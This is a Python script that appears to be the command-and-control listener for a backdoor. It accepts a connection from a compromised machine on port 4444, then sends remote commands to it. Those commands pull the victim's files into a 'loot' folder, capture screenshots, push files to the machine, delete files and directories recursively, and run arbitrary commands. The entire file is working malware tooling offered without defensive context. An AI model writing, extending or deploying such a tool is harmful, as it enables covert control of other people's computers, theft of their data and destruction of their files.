# listener.py
import socket
import json
import base64
import os
import datetime

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections...")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address[0]))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
        print("[+] Sent data:", data)

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue
            except Exception as e:
                return None

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()
        
    def write_file(self, path, content):
        if not os.path.exists("loot"):
            os.makedirs("loot")
        base_path, file_extension = os.path.splitext(path)
        full_path = os.path.join("loot", path)  # Include the "loot" directory in the full path
        
        i = 0
        while True:
            if os.path.exists(full_path):
                i += 1
                new_path = f"{base_path}_{i}{file_extension}"
                full_path = os.path.join("loot", new_path)
            else:
                break
        
        with open(full_path, "wb") as file:
            file.write(base64.b64decode(content))
        print(f"[+] Success. File saved in: {full_path}")

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                f_content = base64.b64encode(file.read()).decode()
                return f_content
        except FileNotFoundError:
            print("[-] File not found.")
            return None
        except Exception as e:
            print(f"[-] Error reading file: {e}")
            return None
            
    def generate_file_name(self, ext):
        current_time = datetime.datetime.now()
        formatted_time = current_time.strftime("%Y-%m-%d_%H-%M-%S.%f")
        return formatted_time + ext

    def print_help_command(self):
        print("[+] Help command:")
        print("    - upload <file_path>: Upload a file to the target machine.")
        print("    - download <file_path>: Download a file from the target machine.")
        print("    - screenshot: Take a screenshot of the target machine.")
        print("    - delete: Deletes a file on the target machine.")
        print("    - delete -R: Deletes directories recursively.")
        print("    - help: Display this help message.")

    def run(self):
        while True:
            command = input("interaction >> ").strip()
            if not command:
                continue

            command = command.split(" ")

            if command[0] == "upload":
                if len(command) < 2:
                    print("[-] Specify the file path to upload.")
                    continue
                else:
                    file_content = self.read_file(command[1])
                    print("czytam plik")

                if file_content:
                    command.append(file_content)
                    result = self.execute_remotely(command)
                else:
                    print("File content problem!")
                continue

            elif command[0] == "help":
                self.print_help_command()
                continue

            elif command[0] == "download":
                if len(command) < 2:
                    print("[-] Specify the file path to download.")
                    continue
                result = self.execute_remotely(command)
                if result[1] != None:
                    self.write_file(command[1], result)

            elif command[0] == "delete":
                if len(command) < 2:
                    print("[-] Specify file path to delete.")
                    continue
                result = self.execute_remotely(command)

            elif command[0] == "screenshot":
                result = self.execute_remotely(command)
                if result:
                    # Decode base64 content before writing to file
                    self.write_file(self.generate_file_name(ext=".png"), result)
                else:
                    print("[-] Failed to take screenshot.")

            else:
                result = self.execute_remotely(command)

            if result is None:
                print("[-] No response from the target machine.")
            else:
                print(result)


try:
    my_listener = Listener("0.0.0.0", 4444)
    my_listener.run()
except KeyboardInterrupt:
    print("\n[-] User requested to quit. Exiting...")
except Exception as e:
    print("[-] An error occurred:", e)
